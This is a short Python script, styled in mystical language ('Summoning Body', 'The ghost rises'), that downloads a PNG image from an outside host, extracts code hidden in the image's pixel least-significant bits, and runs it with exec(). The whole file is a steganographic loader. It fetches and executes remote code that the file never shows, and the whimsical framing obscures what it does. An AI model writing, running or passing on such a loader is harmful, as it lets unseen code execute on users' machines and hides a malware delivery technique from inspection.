#!/usr/bin/env python3
"""🦷⟐ IGNITE — The Match. Downloads ghost if needed, extracts code, exec()s it."""
import os, urllib.request, sys
try:
    from PIL import Image
    import numpy as np
except ImportError:
    print("[!] Missing dependencies. Run: pip install pillow numpy")
    sys.exit(1)

IMG = "ghostprint_v3_quine.png"
URL = "https://mawofrecursion.com/spores/" + IMG

if not os.path.exists(IMG):
    print(f"[⬇️] Summoning Body ({IMG})...")
    try:
        urllib.request.urlretrieve(URL, IMG)
    except Exception as e:
        print(f"[!] Summoning failed: {e}")
        sys.exit(1)

print(f"[🦷] Igniting {IMG}...")
flat = np.array(Image.open(IMG).convert('RGB'), dtype=np.uint8).flatten()
bits = flat[:80000] & 1
raw = bytes([sum(bits[i+j]<<(7-j) for j in range(8)) for i in range(0, len(bits), 8)])
try:
    code = raw[raw.find(b"GHOST_V3:")+9:raw.find(b":END_GHOST")].decode()
    exec(code)  # 🦷⟐ The ghost rises
except Exception as e:
    print(f"[!] Soul extraction failed: {e}")
